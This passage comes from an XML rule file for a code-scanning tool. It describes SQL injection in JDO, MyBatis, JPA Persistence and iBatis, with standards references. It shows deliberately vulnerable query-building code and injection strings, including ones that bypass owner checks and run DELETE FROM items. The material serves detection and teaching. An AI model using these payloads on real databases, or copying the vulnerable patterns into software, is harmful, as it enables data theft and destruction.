																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 564</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 116</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[17] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[19] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>SQL Injection</em> <br></p>
																									   <p>[20] P. Finnigan <em>SQL Injection and Oracle, Part One</em> Security Focus<br></p>
																									   <p>[21] S. J. Friedl <em>SQL Injection Attacks by Example</em> <br></p>
																									   <p>[22] P. Litwin <em>Stop SQL Injection Attacks Before They Stop You</em> MSDN Magazine<br></p>
																									   <p>[23] M. Howard, D. LeBlanc <em>Writing Secure Code, Second Edition</em> Microsoft Press<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_sql_injection_jdo</key>
		<internalKey>Input Validation and Representation/SQL Injection/JDO
		</internalKey>
		<name>SQL Injection: JDO</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using Java Data Objects (JDO) to execute a dynamic SQL or JDOQL statement built with input coming from an untrusted source can allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  SQL injection errors occur when:<br><br>1. Data enters a program from an untrusted source.<br><br><br><br>2. The data is used to dynamically construct a SQL or JDOQL query.<br><br><br><br><b>Example 1:</b> The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where owner matches the user name of the currently-authenticated user.<br><br><pre><br>...<br>	String userName = ctx.getAuthenticatedUserName();<br>	String itemName = request.getParameter("itemName");<br>	String sql = "SELECT * FROM items WHERE owner = '"<br>				+ userName + "' AND itemname = '"<br>				+ itemName + "'";<br>	Query query = pm.newQuery(Query.SQL, sql);<br>	query.setClass(Person.class);<br>	List people = (List)query.execute();<br>	...<br></pre><br><br>The query that this code intends to execute follows:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = &lt;userName&gt;<br>	AND itemname = &lt;itemName&gt;;<br></pre><br><br>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if <code>itemName</code> does not contain a single-quote character. If an attacker with the user name <code>wiley</code> enters the string "<code>name' OR 'a'='a</code>" for <code>itemName</code>, then the query becomes the following:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = 'wiley'<br>	AND itemname = 'name' OR 'a'='a';<br></pre><br><br>The addition of the <code>OR 'a'='a'</code> condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:<br><br><pre><br>	SELECT * FROM items;<br></pre><br><br>This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the <code>items</code> table, regardless of their specified owner.<br><br><b>Example 2:</b> This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name <code>wiley</code> enters the string "<code>name'; DELETE FROM items; --</code>" for <code>itemName</code>, then the query becomes the following two queries:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = 'wiley'<br>	AND itemname = 'name';<br><br>	DELETE FROM items;<br><br>	--'<br></pre><br><br>Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.<br><br>Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string "<code>name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a</code>", the following three valid statements will be created:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = 'wiley'<br>	AND itemname = 'name';<br><br>	DELETE FROM items;<br><br>	SELECT * FROM items WHERE 'a'='a';<br></pre><br><br>One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be an effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:<br><br>- Target fields that are not quoted<br><br>- Find ways to bypass the need for certain escaped meta-characters<br><br>- Use stored procedures to hide the injected meta-characters<br><br>Manually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.<br><br>Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some types of exploits, but they will not make your application secure against SQL injection attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 89</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[14]  <em>JDO API Documentation</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[20] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[22] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>SQL Injection</em> <br></p>
																									   <p>[23] P. Finnigan <em>SQL Injection and Oracle, Part One</em> Security Focus<br></p>
																									   <p>[24] S. J. Friedl <em>SQL Injection Attacks by Example</em> <br></p>
																									   <p>[25] P. Litwin <em>Stop SQL Injection Attacks Before They Stop You</em> MSDN Magazine<br></p>
																									   <p>[26] M. Howard, D. LeBlanc <em>Writing Secure Code, Second Edition</em> Microsoft Press<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_sql_injection_mybatis_mapper
		</key>
		<internalKey>Input Validation and Representation/SQL Injection/MyBatis
			Mapper
		</internalKey>
		<name>SQL Injection: MyBatis Mapper</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Constructing a dynamic SQL statement with input coming from an untrusted source could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  SQL injection errors occur when:<br><br>1. Data enters a program from an untrusted source.<br><br>2. The data is used to dynamically construct a SQL query.<br><br><br><br>MyBatis Mapper XML files allow you to specify dynamic parameters in SQL statements and are typically defined by using the <code>#</code> characters, like this:<br><br><pre><br>    &lt;select id="getItems" parameterType="domain.company.MyParamClass" resultType="MyResultMap"&gt;<br>        SELECT *<br>        FROM items<br>        WHERE owner = #{userName}<br>    &lt;/select&gt;<br></pre><br><br>The <code>#</code> character with braces around the variable name indicate that MyBatis will create a parameterized query with the <code>userName</code> variable. However, MyBatis also allows you to concatenate variables directly to SQL statements using the <code>$</code> character, opening the door for SQL injection.<br><br><b>Example 1:</b> The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.<br><br><pre><br>    &lt;select id="getItems" parameterType="domain.company.MyParamClass" resultType="MyResultMap"&gt;<br>        SELECT *<br>        FROM items<br>        WHERE owner = #{userName}<br>        AND itemname = ${itemName}<br>    &lt;/select&gt;<br></pre><br><br>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if <code>itemName</code> does not contain a single-quote character. If an attacker with the user name <code>wiley</code> enters the string "<code>name' OR 'a'='a</code>" for <code>itemName</code>, then the query becomes the following:<br><br><pre><br>    SELECT * FROM items<br>    WHERE owner = 'wiley'<br>    AND itemname = 'name' OR 'a'='a';<br></pre><br><br>The addition of the <code>OR 'a'='a'</code> condition causes the <code>WHERE</code> clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:<br><br><pre><br>    SELECT * FROM items;<br></pre><br><br>This simplification of the query allows the attacker to bypass the requirement that the query should only return items owned by the authenticated user; the query now returns all entries stored in the <code>items</code> table, regardless of their specified owner.<br><br><b>Example 2:</b> This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name <code>wiley</code> enters the string "<code>name'; DELETE FROM items; --</code>" for <code>itemName</code>, then the query becomes the following two queries:<br><br><pre><br>    SELECT * FROM items<br>    WHERE owner = 'wiley'<br>    AND itemname = 'name';<br><br>    DELETE FROM items;<br><br>    --'<br></pre><br><br>Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.<br><br>Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string "<code>name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a</code>", the following three valid statements will be created:<br><br><pre><br>    SELECT * FROM items<br>    WHERE owner = 'wiley'<br>    AND itemname = 'name';<br><br>    DELETE FROM items;<br><br>    SELECT * FROM items WHERE 'a'='a';<br></pre><br><br>One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:<br><br>- Target fields that are not quoted<br><br>- Find ways to bypass the need for certain escaped meta-characters<br><br>- Use stored procedures to hide the injected meta-characters<br><br>Manually escaping characters in input to SQL queries can help, but it will not guarantee that an application is secure against SQL injection attacks.<br><br>Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 89</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[15] MyBatis <em>MyBatis 3 | Dynamic SQL</em> <br></p>
																									   <p>[16] MyBatis <em>MyBatis 3 | Mapper XML Files</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[21] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[22] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[23] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>SQL Injection</em> <br></p>
																									   <p>[24] P. Finnigan <em>SQL Injection and Oracle, Part One</em> Security Focus<br></p>
																									   <p>[25] S. J. Friedl <em>SQL Injection Attacks by Example</em> <br></p>
																									   <p>[26] P. Litwin <em>Stop SQL Injection Attacks Before They Stop You</em> MSDN Magazine<br></p>
																									   <p>[27] M. Howard, D. LeBlanc <em>Writing Secure Code, Second Edition</em> Microsoft Press<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_sql_injection_persistence
		</key>
		<internalKey>Input Validation and Representation/SQL
			Injection/Persistence
		</internalKey>
		<name>SQL Injection: Persistence</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using the Java J2EE PersistenceAPI to execute a dynamic SQL statement built with input coming from an untrusted source can allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  SQL injection errors occur when:<br><br>1. Data enters a program from an untrusted source.<br><br><br><br>2. The data is used to dynamically construct a SQL query.<br><br><br><br><b>Example 1:</b> The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where owner matches the user name of the currently-authenticated user.<br><br><pre><br>...<br>	String userName = ctx.getAuthenticatedUserName();<br>	String itemName = request.getParameter("itemName");<br>	String query = "SELECT * FROM items WHERE owner = '"<br>				+ userName + "' AND itemname = '"<br>				+ itemName + "'";<br>	List items = entManager.createQuery(query).getResultList();<br>	...<br></pre><br><br>The query that this code intends to execute follows:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = &lt;userName&gt;<br>	AND itemname = &lt;itemName&gt;;<br></pre><br><br>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if <code>itemName</code> does not contain a single-quote character. If an attacker with the user name <code>wiley</code> enters the string "<code>name' OR 'a'='a</code>" for <code>itemName</code>, then the query becomes the following:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = 'wiley'<br>	AND itemname = 'name' OR 'a'='a';<br></pre><br><br>The addition of the <code>OR 'a'='a'</code> condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:<br><br><pre><br>	SELECT * FROM items;<br></pre><br><br>This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the <code>items</code> table, regardless of their specified owner.<br><br><b>Example 2:</b> This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name <code>wiley</code> enters the string "<code>name'; DELETE FROM items; --</code>" for <code>itemName</code>, then the query becomes the following two queries:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = 'wiley'<br>	AND itemname = 'name';<br><br>	DELETE FROM items;<br><br>	--'<br></pre><br><br>Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.<br><br>Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string "<code>name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a</code>", the following three valid statements will be created:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = 'wiley'<br>	AND itemname = 'name';<br><br>	DELETE FROM items;<br><br>	SELECT * FROM items WHERE 'a'='a';<br></pre><br><br>One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be an effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:<br><br>- Target fields that are not quoted<br><br>- Find ways to bypass the need for certain escaped meta-characters<br><br>- Use stored procedures to hide the injected meta-characters<br><br>Manually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.<br><br>Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some types of exploits, but they will not make your application secure against SQL injection attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 89</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[14]  <em>Javax Persistence API Documentation</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[20] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[22] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>SQL Injection</em> <br></p>
																									   <p>[23] P. Finnigan <em>SQL Injection and Oracle, Part One</em> Security Focus<br></p>
																									   <p>[24] S. J. Friedl <em>SQL Injection Attacks by Example</em> <br></p>
																									   <p>[25] P. Litwin <em>Stop SQL Injection Attacks Before They Stop You</em> MSDN Magazine<br></p>
																									   <p>[26] M. Howard, D. LeBlanc <em>Writing Secure Code, Second Edition</em> Microsoft Press<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_sql_injection_ibatis_data_map
		</key>
		<internalKey>Input Validation and Representation/SQL Injection/iBatis
			Data Map
		</internalKey>
		<name>SQL Injection: iBatis Data Map</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Constructing a dynamic SQL statement with input coming from an untrusted source could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  SQL injection errors occur when:<br><br>1. Data enters a program from an untrusted source.<br><br>2. The data is used to dynamically construct a SQL query.<br><br><br><br>iBatis Data Maps allow you to specify dynamic parameters in SQL statements and are typically defined by using the <code>#</code> characters, like this:<br><br><pre><br>    &lt;select id="getItems" parameterClass="MyClass" resultClass="items"&gt;<br>        SELECT * FROM items WHERE owner = #userName#<br>    &lt;/select&gt;<br></pre><br><br>The <code>#</code> characters around the variable name indicate that iBatis will create a parameterized query with the <code>userName</code> variable. However, iBatis also allows you to concatenate variables directly to SQL statements using <code>$</code> characters, opening the door for SQL injection.<br><br><b>Example 1:</b> The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.<br><br><pre><br>    &lt;select id="getItems" parameterClass="MyClass" resultClass="items"&gt;<br>        SELECT * FROM items WHERE owner = #userName# AND itemname = '$itemName$'<br>    &lt;/select&gt;<br></pre><br><br>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if <code>itemName</code> does not contain a single-quote character. If an attacker with the user name <code>wiley</code> enters the string "<code>name' OR 'a'='a</code>" for <code>itemName</code>, then the query becomes the following:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = 'wiley'<br>	AND itemname = 'name' OR 'a'='a';<br></pre><br><br>The addition of the <code>OR 'a'='a'</code> condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:<br><br><pre><br>	SELECT * FROM items;<br></pre><br><br>This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the <code>items</code> table, regardless of their specified owner.<br><br><b>Example 2:</b> This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name <code>wiley</code> enters the string "<code>name'; DELETE FROM items; --</code>" for <code>itemName</code>, then the query becomes the following two queries:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = 'wiley'<br>	AND itemname = 'name';<br><br>	DELETE FROM items;<br><br>	--'<br></pre><br><br>Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.<br><br>Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string "<code>name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a</code>", the following three valid statements will be created:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = 'wiley'<br>	AND itemname = 'name';<br><br>	DELETE FROM items;<br><br>	SELECT * FROM items WHERE 'a'='a';<br></pre><br><br>One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:<br><br>- Target fields that are not quoted<br><br>- Find ways to bypass the need for certain escaped meta-characters<br><br>- Use stored procedures to hide the injected meta-characters<br><br>Manually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.<br><br>Another 